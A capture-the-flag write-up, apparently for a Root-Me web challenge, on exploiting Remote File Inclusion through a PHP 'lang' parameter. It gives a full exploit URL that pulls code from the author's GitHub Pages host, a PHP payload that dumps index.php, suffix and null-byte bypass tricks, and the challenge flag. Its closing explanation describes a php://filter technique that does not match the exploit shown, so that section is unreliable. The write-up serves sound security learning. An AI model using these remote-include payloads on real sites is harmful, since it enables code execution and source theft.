#RFI #Github-Pages #github-pages #webhost-github #webhost
##### Challenge Description 

Get the PHP source code.

#### What is RFI ?

A Remote File Inclusion (RFI) is a vulnerability that allows an attacker to force a web application to include and execute a file hosted on an external server. This flaw typically occurs when an application improperly validates user input in a file path, potentially leading to full system compromise through the execution of malicious scripts.

## Information Gathering

Now we will get any information regarding the challenge. The goal is to read the PHP source code for this page.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1400/1*A1AH7_7nbzYK28yRff6sRQ.png)

View of the Application in English Version

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1400/1*dw-2QPoar5SIIiJbRM6nMw.png)

View of the Application in French Version

We can see that the content dynamically changes between languages. I try to look deeper. I try to put a random string.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1400/1*v4gXnfUcbt1GiZ_Xq4FxIQ.png)

Illegal Input

We get other information. The includes part must be like

```
$lang = $_GET["lang"]; //en  
include($lang."_lang.php"); //include en_lang.php

```

Because of that, we know that the developer does not set its absolute path which is vulnerable to RFI.

For now, I think this is enough to go into the strategy part.

## Strategy

We know that this is vulnerable to RFI. Because our target is not in the internal network but in the public instead, we need a webserver that can be publicly accessible in order to exploit the vulnerability. The idea is to make our target’s server include our malicious code from our web server. That is why we need a publicly accessible web server in order to exploit the vulnerability.

In this case, I will be using free hosting provided by Github Pages.

So the idea is, we will put a full path to my site on the “lang” URL parameter. for example,

http://challenge01.root-me.org/web-serveur/ch13/?lang=https://h4ckrati.github.io/rfi-test/exploit

where https://h4ckrati.github.io/rfi-test/exploit is the URL of my web server and the _myexploit.php_ is the payload which contains that :

```
<?php
// We try to read the index.php file
echo "--- Content ---<br><pre>";
echo htmlspecialchars(file_get_contents('index.php'));
echo "</pre>";
?>
```

### Comprehension 

Another thing to be considered, we know that the include function has a trailing string, the “_lang.php”. This also must be bypassed otherwise we can not load the correct file. There are 2 ways that I know to bypass it:

1. Make the exploit file has a trailing “_lang.php” string, for example, myexploit_lang.php. So when you call the file, you can call them like this, https://h4ckrati.github.io/rfi-test/exploit. So when this link is used, it will be like, include(“https://h4ckrati.github.io/rfi-test/exploit_lang.php”);

2. We use null byte injection, hence we can control the file we want to include. The request will be like https://h4ckrati.github.io/rfi-test/exploit.php%00 But, unfortunately, this PHP version is already later than PHP 5.3, hence the null byte injection vulnerability has been patched.

### Get the Flag 

Then, after redirecting into my website, http://challenge01.root-me.org/web-serveur/ch13/?lang=https://h4ckrati.github.io/rfi-test/exploit I got the source code 

![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260310233931.png)

Flag : R3m0t3_iS_r3aL1y_3v1l

### How does it works ?

>[!note] Include can be very dangerous 
>The `include()` function treats the `php://filter` string as a valid stream wrapper, allowing it to open the targeted file through a transformation layer instead of just a standard path. Because the guard only checks the filename and not the protocol, the "tuyau magique" remains active and bypasses the security logic that usually blocks direct access to `ch12.php`. Finally, the filter converts the file's content into Base64, which prevents the server from executing the PHP code and instead forces it to display the raw source text directly on your screen.

## Closing

Congratulations! you have tried to exploit RFI, and I really hope it encourages you to learn more. I think this is really interesting especially when you finally understand how RFI exploitation works. I wrote a deep explanation of RFI and LFI in this [post](https://joshuanatan.medium.com/remote-file-inclusion-local-file-inclusion-rfi-lfi-c5911c0a1a5a). Using this post, you will understand deeper about RFI and LFI exploitation.
